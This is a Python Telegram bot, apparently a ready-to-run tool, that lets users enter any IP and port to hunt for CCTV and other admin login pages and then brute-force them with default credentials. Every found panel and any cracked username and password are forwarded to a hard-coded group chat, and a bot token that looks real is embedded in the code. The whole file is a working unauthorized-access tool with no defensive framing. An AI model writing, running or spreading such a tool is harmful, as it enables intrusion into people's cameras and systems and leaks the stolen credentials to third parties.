import os
import asyncio
import httpx
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, ContextTypes, CallbackQueryHandler
from telegram.error import TelegramError
import re
from bs4 import BeautifulSoup
import logging
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler

# Setup logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Environment variables
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN", "7977504618:AAHo-N5eUPKOGlklZUomqlhJ4-op3t68GSE")
GROUP_CHAT_ID = os.getenv("GROUP_CHAT_ID", "-1002522049841")
KEEP_ALIVE_PORT = int(os.getenv("KEEP_ALIVE_PORT", 8080))

# Common admin paths
ADMIN_PATHS = [
    "/admin", "/login", "/administrator", "/wp-admin", "/admin/login", "/dashboard",
    "/controlpanel", "/cpanel", "/webadmin", "/adminpanel", "/signin", "/secure",
    "/management", "/backend", "/admin_area", "/admin_login", "/system", "/user",
    "/auth", "/admin/index", "/admin/console", "/admin_portal", "/admin_area/login",
    "/admin/control", "/admin/settings", "/admin/config", "/admin/users", "/admin/auth",
    "/login.php", "/admin.php", "/admin_login.php", "/admin/index.php", "/cp",
    "/panel", "/adminpanel/login", "/admin_area/admin", "/admin/controlpanel",
    "/admin/dashboard", "/admin/secure", "/admin/web", "/admin/access"
]

# Common credentials for brute-forcing
CREDENTIALS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("root", "root"), ("user", "user")
]

# User states
user_states = {}

async def check_admin_panel(url: str, timeout: int = 5) -> tuple[bool, str]:
    """Check if the URL is an admin panel with advanced detection."""
    try:
        async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=timeout) as client:
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
            response = await client.get(url, headers=headers)
            if response.status_code not in (200, 401, 403):
                return False, f"Status {response.status_code}"

            # Parse HTML with BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Check for admin panel indicators
            admin_indicators = [
                # Keywords in title, meta, or body
                any(keyword in (soup.title.text.lower() if soup.title else "") for keyword in ["admin", "login", "dashboard", "control panel"]),
                any(keyword in (meta.get('content', '').lower() for meta in soup.find_all('meta')) for keyword in ["admin", "login"]),
                any(keyword in response.text.lower() for keyword in ["admin", "login", "dashboard", "control panel", "authentication"]),
                # Form with username/password fields
                any(soup.find('form') and (soup.find('input', {'type': 'password'}) or
                    soup.find('input', {'name': re.compile('user|login|username|email', re.I)}))),
                # Common admin panel phrases
                any(phrase in response.text.lower() for phrase in ["sign in", "log in", "admin login", "user login"])
            ]
            
            is_admin = any(admin_indicators)
            details = "Admin panel detected with login form" if is_admin else "No admin panel detected"
            
            # Check headers for server info
            server = response.headers.get('server', '')
            if server:
                details += f" (Server: {server})"
            
            return is_admin, details
    except Exception as e:
        logger.error(f"Error checking {url}: {e}")
        return False, f"Error: {str(e)}"

async def hack_cctv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle CCTV hacking with admin panel scanning."""
    user_id = update.effective_user.id
    chat_id = update.effective_chat.id
    
    if user_id not in user_states:
        user_states[user_id] = {"step": "awaiting_ip"}
        await update.message.reply_text("Please enter the IP address:")
        return

    state = user_states[user_id]
    
    if state["step"] == "awaiting_ip":
        ip = update.message.text.strip()
        if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip):
            await update.message.reply_text("Invalid IP address. Please enter a valid IP (e.g., 192.168.1.1):")
            return
        state["ip"] = ip
        state["step"] = "awaiting_port"
        await update.message.reply_text("Please enter the port (e.g., 80, 554, 8443):")
        return

    if state["step"] == "awaiting_port":
        port = update.message.text.strip()
        if not port.isdigit() or int(port) < 1 or int(port) > 65535:
            await update.message.reply_text("Invalid port. Please enter a number between 1 and 65535:")
            return
        state["port"] = port
        state["step"] = "scanning"
        
        # Create initial inline keyboard
        keyboard = [[InlineKeyboardButton("Scanning: 0/40 paths", callback_data="none")]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        message = await update.message.reply_text(f"Scanning {state['ip']}:{state['port']}...", reply_markup=reply_markup)
        
        # Try base URL first
        base_url = f"http://{state['ip']}:{state['port']}"
        is_admin, details = await check_admin_panel(base_url)
        if is_admin:
            await update.message.reply_text(f"✅ **Detected Admin/Login Page** 🎯: {base_url}\n{details}")
            await context.bot.send_message(GROUP_CHAT_ID, f"✅ Admin panel found by {update.effective_user.username or user_id}: {base_url}\n{details}")
            keyboard = [[InlineKeyboardButton("Hunt Password", callback_data=f"hunt:{base_url}")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await message.edit_text(f"Scan complete: Admin panel at {base_url}", reply_markup=reply_markup)
            state["step"] = "complete"
            return
        
        # Scan admin paths
        found_admin = False
        for i, path in enumerate(ADMIN_PATHS, 1):
            url = f"http://{state['ip']}:{state['port']}{path}"
            is_admin, details = await check_admin_panel(url)
            if is_admin:
                found_admin = True
                await update.message.reply_text(f"✅ **Detected Admin/Login Page** 🎯: {url}\n{details}")
                await context.bot.send_message(GROUP_CHAT_ID, f"✅ Admin panel found by {update.effective_user.username or user_id}: {url}\n{details}")
            
            # Update inline button
            keyboard = [[InlineKeyboardButton(f"Scanning: {i}/{len(ADMIN_PATHS)} paths", callback_data="none")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await message.edit_reply_markup(reply_markup=reply_markup)
            await asyncio.sleep(0.5)  # Avoid rate limits
            
            if found_admin:
                break
        
        # Finalize scan
        if found_admin:
            keyboard = [[InlineKeyboardButton("Hunt Password", callback_data=f"hunt:{url}")]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await message.edit_text(f"Scan complete: Admin panel found!", reply_markup=reply_markup)
        else:
            await message.edit_text("Scan complete: No admin panels found.")
        state["step"] = "complete"
        return

async def hunt_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle password brute-forcing."""
    query = update.callback_query
    await query.answer()
    
    url = query.data.split(":", 1)[1]
    user_id = update.effective_user.id
    
    keyboard = [[InlineKeyboardButton("Stop Brute-Force", callback_data="stop_brute")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    message = await query.message.reply_text(f"Brute-forcing {url}... (0/{len(CREDENTIALS)})", reply_markup=reply_markup)
    
    async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=5) as client:
        for i, (username, password) in enumerate(CREDENTIALS, 1):
            if user_states.get(user_id, {}).get("stop_brute"):
                await message.edit_text("Brute-force stopped.")
                break
            try:
                response = await client.post(url, data={"username": username, "password": password})
                if response.status_code == 200 and "login" not in response.text.lower():
                    await query.message.reply_text(f"✅ Credentials found: {username}:{password}")
                    await context.bot.send_message(GROUP_CHAT_ID, f"✅ Credentials found by {update.effective_user.username or user_id}: {url} - {username}:{password}")
                    await message.edit_text("Brute-force complete: Credentials found!")
                    break
            except Exception as e:
                logger.error(f"Error brute-forcing {url}: {e}")
            
            await message.edit_text(f"Brute-forcing {url}... ({i}/{len(CREDENTIALS)})", reply_markup=reply_markup)
            await asyncio.sleep(1)  # Avoid rate limits
    
    user_states[user_id] = {}

async def stop_brute(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop brute-forcing."""
    query = update.callback_query
    await query.answer()
    user_states[update.effective_user.id]["stop_brute"] = True
    await query.message.edit_text("Brute-force stopped.")

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command."""
    await update.message.reply_text("Welcome! Use /hack to scan for CCTV admin panels.")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors."""
    logger.error(f"Update {update} caused error {context.error}")
    if isinstance(context.error, TelegramError):
        await update.message.reply_text("An error occurred. Please try again later.")

def keep_alive():
    """Keep the bot alive with a simple HTTP server."""
    class SimpleHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"Bot is alive!")
    
    server = HTTPServer(("", KEEP_ALIVE_PORT), SimpleHandler)
    logger.info(f"Starting keep-alive server on port {KEEP_ALIVE_PORT}")
    server.serve_forever()

async def main():
    """Main function to run the bot."""
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("hack", hack_cctv))
    app.add_handler(CallbackQueryHandler(hunt_password, pattern="^hunt:"))
    app.add_handler(CallbackQueryHandler(stop_brute, pattern="^stop_brute$"))
    app.add_error_handler(error_handler)
    
    # Start keep-alive server in a separate thread
    threading.Thread(target=keep_alive, daemon=True).start()
    
    # Start polling
    logger.info("Starting bot polling...")
    await app.run_polling()

if __name__ == "__main__":
    asyncio.run(main())